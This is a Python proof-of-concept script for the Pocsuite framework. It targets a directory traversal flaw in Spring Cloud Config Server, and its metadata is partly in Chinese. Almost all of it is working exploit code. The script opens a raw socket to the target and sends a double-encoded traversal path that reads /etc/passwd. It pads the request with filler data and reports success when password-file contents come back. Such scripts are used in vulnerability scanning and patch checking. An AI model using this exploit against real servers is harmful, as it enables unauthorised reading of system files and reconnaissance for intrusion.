#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urllib
import socket
import time

class TestPOC(POCBase):
    vulID = '97912'  # ssvid
    version = '2.1.0-2.1.1or2.0.0-2.0.3or1.4.0-1.4.5'
    author = ['co0ontty']
    vulDate = '2019-7-19'
    createDate = '2019-7-19'
    updateDate = '2019-4-17'
    references = ['https://www.seebug.org/vuldb/ssvid-97912']
    name = 'Spring Cloud Config Server 路径穿越与任意文件读取漏洞'
    appPowerLink = 'https://github.com/spring-cloud/spring-cloud-config'
    appName = 'Spring Cloud Config'
    appVersion = '2.1.0-2.1.1or2.0.0-2.0.3or1.4.0-1.4.5'
    vulType = 'Directory traversal'
    desc = '''
        该漏洞本质是允许应用程序通过spring-cloud-config-server模块获取任意配置文件,攻击者可以构造恶意URL实现目录遍历漏洞的利用。
    '''
    samples = ['']
    install_requires = ['']



    def _verify(self):
        '''verify mode'''
        vul_url = self.url
        proto,rest = urllib.splittype(vul_url)
        host,rest = urllib.splithost(rest)
        host,port = urllib.splitport(host)
        result = {}
        if port is None:
            port = 8888
        sock = socket.socket()
        sock.connect((host,int(port)))
        sock.send('GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.0\r\n'.encode('ascii'))
        sock.send('Host: {}\r\n'.format(host).encode('ascii'))
        sock.send('\r\n'.encode('ascii'))
        str_five = 'testssdfsf ' * 200
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        sock.send(str_five.encode('ascii'))
        chunk = sock.recv(4096)
        sock.close()
        if  "bin" in chunk and "/usr/sbin" in chunk and "root" in chunk:
            print(chunk)
            result['VerifyInfo'] = "success"
        pass
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

   

register(TestPOC)